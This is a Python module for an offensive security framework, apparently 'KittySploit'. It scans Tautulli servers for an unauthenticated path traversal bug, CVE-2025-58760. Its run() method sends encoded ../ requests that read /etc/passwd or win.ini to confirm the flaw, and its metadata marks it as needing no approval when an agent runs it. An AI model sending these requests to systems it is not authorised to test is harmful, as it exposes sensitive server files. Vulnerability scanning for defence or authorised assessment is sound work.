#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Tautulli unauthenticated path traversal via /image and pms_image_proxy (CVE-2025-58760/61)."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Tautulli < 2.16.0 - Unauthenticated Path Traversal (CVE-2025-58760)',
        'description': (
            'Tautulli prior to 2.16.0 allows unauthenticated path traversal via /image/images/ '
            'and /pms_image_proxy?img=... (CVE-2025-58760 / CVE-2025-58761). Presence also '
            'indicates related authenticated RCE issues CVE-2025-58762/58763.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'tautulli', 'lfi', 'exposure',
            'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/tautulli_cve_2025_58760_file_read'],
            },
        },
        'references': [
            'https://github.com/Tautulli/Tautulli/security/advisories/GHSA-8g4r-8f3f-hghp',
            'https://github.com/Tautulli/Tautulli/security/advisories/GHSA-r732-m675-wj7w',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-58760',
        ],
        'cve': 'CVE-2025-58760',
    }

    def run(self):
        # Encode dots so requests does not collapse the traversal segments.
        traversal = '/'.join(['%2e%2e'] * 10) + '/'
        bases = (
            f'/image/images/{traversal}',
            f'/pms_image_proxy?img=interfaces/default/images/{traversal}',
        )
        files = (
            ('etc/passwd', r'root:.*:0:0:'),
            ('windows/win.ini', r'\[fonts\]'),
        )
        for base in bases:
            for rel, pattern in files:
                path = base + rel
                r = self.http_request(method='GET', path=path, allow_redirects=False)
                if not r or r.status_code != 200:
                    continue
                body = r.text or ''
                if re.search(pattern, body, re.IGNORECASE):
                    self.set_info(
                        severity='high',
                        reason='Tautulli CVE-2025-58760 unauthenticated path traversal',
                        path=path,
                    )
                    return True
        return False
